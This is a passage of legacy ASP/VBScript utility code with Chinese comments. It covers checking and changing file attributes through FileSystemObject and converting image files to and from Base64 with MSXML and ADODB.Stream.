    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = true then
            set openFile = fso.getFile(fileName)
                existsZhiDuFile = openFile.attributes 
            set openFile = nothing 
            if existsZhiDuFile >= 128 then existsZhiDuFile = existsZhiDuFile - 128 
            if existsZhiDuFile >= 64 then existsZhiDuFile = existsZhiDuFile - 64 
            if existsZhiDuFile >= 32 then existsZhiDuFile = existsZhiDuFile - 32 
            if existsZhiDuFile >= 8 then existsZhiDuFile = existsZhiDuFile - 8 
            if existsZhiDuFile >= 4 then existsZhiDuFile = existsZhiDuFile - 4 
            if existsZhiDuFile >= 2 then existsZhiDuFile = existsZhiDuFile - 2 
            existsZhiDuFile = CBool(existsZhiDuFile)                                        '让它成为布而类型
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "ExistsZhiDuFile 判断只读文件 函数出错，FileName=" & fileName )
end function 

function editFileAttribute(byVal fileName, byVal n)
    on error resume next 
    dim fso, openFile 
    call handlePath(fileName)                                                       '获得完整路径
    editFileAttribute = false 
    set fso = createObject("Scripting.FileSystemObject")
        if fso.fileExists(fileName) = true then
            set openFile = fso.getFile(fileName)
                openFile.attributes = n                            '32文件
            set openFile = nothing 
            editFileAttribute = true 
        end if 
    set fso = nothing 
    if err then call doError(Err.description, "EditFileAttribute 修改文件属性 函数出错，FileName=" & fileName )
end function 

'图片转Base64 20150722引用网上 call echo("images/error.gif",ImagesToBase64("images/error.gif"))
function imagesToBase64(fileName)
    dim xml 
    dim root 
    dim fs 
    dim filePath 
    dim objStream 
    dim objXMLDoc 
    dim base64 
    dim getFileExt 
    '定义变量完结
    '创建对像
    filePath = handlePath(fileName) 
    getFileExt = mid(filePath, inStrRev(filePath, ".") + 1) 
    set objXMLDoc = createObject("msxml2.FreeThreadedDOMDocument")
        '设定生成XML文档的根为 Base64Data
        objXMLDoc.loadxml "<?xml version='1.0'?><Base64Data />" 
        set fs = createObject("Scripting.FileSystemObject")                             ''服务器需要FSO组件
            if fs.fileExists(filePath) then                                                 '判断File文件是否存在
                '用 stream 来读取数据
                set objStream = createObject("ADODB.Stream")
                    objStream.type = 1 
                    objStream.open 
                    objStream.loadFromFile filePath 


                    objXMLDoc.documentElement.dataType = "bin.base64" 
                    objXMLDoc.documentElement.nodeTypedValue = objStream.read 
                    '数据流读取结束.得到了值 objXMLDoc
                    '创建XML文件
                    set xml = createObject("msxml2.FreeThreadedDOMDocument")
                        xml.load objXMLDoc 
                        if xml.readyState > 2 then
                            set root = xml.getElementsByTagName("Base64Data")
                                'Base64="<img src=""data:image/"&getFileExt&";base64,"&vbcrlf&root.Item(0).Text&""">"
                                'Base64 = "data:image/" & getFileExt & ";base64," & vbCrLf & root.item(0).text
                                base64 = root.item(0).text 
                        else
                            base64 = "" 
                        end if 
                            set xml = nothing
                    set objStream = nothing
            else
                base64 = "" 
            end if 

                set fs = nothing
        set objXMLDoc = nothing


        imagesToBase64 = base64 
end function

'Base64转图片 20150722 引用网上   call Base64ToImages("1.jpg",Base64Data)
function base64ToImages(saveImagePath, base64Data)
    dim xmlStr 
    saveImagePath = handlePath(saveImagePath) 
    xmlStr = "<data>" & base64Data & "</data>" 
    dim xml : xml = createObject("MSXML2.DOMDocument")
        dim stm : stm = createObject("ADODB.Stream")
            xml.resolveExternals = false 
            xml.loadxml(xmlStr) 
            xml.documentElement.setAttribute "xmlns:dt", "urn:schemas-microsoft-com:datatypes" 
            xml.documentElement.dataType = "bin.base64" 
            stm.type = 1                                                                    'adTypeBinary
            stm.open 
            stm.write xml.documentElement.nodeTypedValue 
            stm.saveToFile saveImagePath 
            stm.close 
        set xml = nothing 
    set stm = nothing 
end function 

%>  
